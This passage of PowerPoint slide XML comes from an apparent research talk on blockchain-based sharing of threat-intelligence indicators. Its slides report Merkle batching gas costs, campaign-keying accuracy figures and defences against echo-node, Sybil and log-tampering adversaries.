            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="tile rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3154680" y="1417320"/>
            <a:ext cx="9144" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="cost tile 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1371600"/>
            <a:ext cx="2468880" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>337</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gas per IOC at B = 64</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>64 hashes under one Merkle root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="tile rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="1417320"/>
            <a:ext cx="9144" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="cost tile 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1371600"/>
            <a:ext cx="2468880" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3.01 ms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>per block to bootstrap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Linear in history, R² = 0.998</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="10" name="batching chart" descr=""/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="2560320"/>
          <a:ext cx="8229600" cy="210312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8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No single keying function fits every campaign</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="accuracy chart" descr=""/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="1325880"/>
          <a:ext cx="5486400" cy="3291840"/>
        </p:xfrm>
        <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/chart">
            <c:chart xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" r:id="rId1"/>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="insight 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1417320"/>
            <a:ext cx="2331720" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exact record</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100% precision, but finds only 27.5% of campaigns that vary per target.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="insight rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2395728"/>
            <a:ext cx="2331720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="insight 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2468880"/>
            <a:ext cx="2331720" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Template</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Strips tokens and IPs, merges unrelated campaigns: F1 0.15.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="insight rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3447288"/>
            <a:ext cx="2331720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="insight 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3520440"/>
            <a:ext cx="2331720" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/24 + template</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Best: 100% precision, 81.2% recall, F1 0.89.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Adversaries: what the scheme catches</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="False corroboration by an echo node icon" descr="False corroboration by an echo node">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="security 1 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1920240"/>
            <a:ext cx="2468880" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100% → 0%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="security 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2560320"/>
            <a:ext cx="2377440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>False corroboration by an echo node</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="security 1 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3154680"/>
            <a:ext cx="2377440" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Plain tag vs. commit–reveal, at 2.0× the gas. Genuinely shared hashes still corroborated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="security rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3154680" y="1463040"/>
            <a:ext cx="9144" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Sybil: fakes pass only with k identities icon" descr="Sybil: fakes pass only with k identities">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1463040"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="security 2 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1920240"/>
            <a:ext cx="2468880" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c ≥ k</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="security 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="2560320"/>
            <a:ext cx="2377440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sybil: fakes pass only with k identities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="security 2 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="3154680"/>
            <a:ext cx="2377440" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The threshold bounds Sybils, so identity must be controlled: a permissioned or stake-weighted chain.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="security rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="1463040"/>
            <a:ext cx="9144" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Local-log edits detected icon" descr="Local-log edits detected">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1463040"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="security 3 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1920240"/>
            <a:ext cx="2468880" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>500 / 500</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="security 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2560320"/>
            <a:ext cx="2377440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Local-log edits detected</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="security 3 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3154680"/>
            <a:ext cx="2377440" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0 false positives on 500 untouched records; 9.6 µs per check.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CONCLUSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
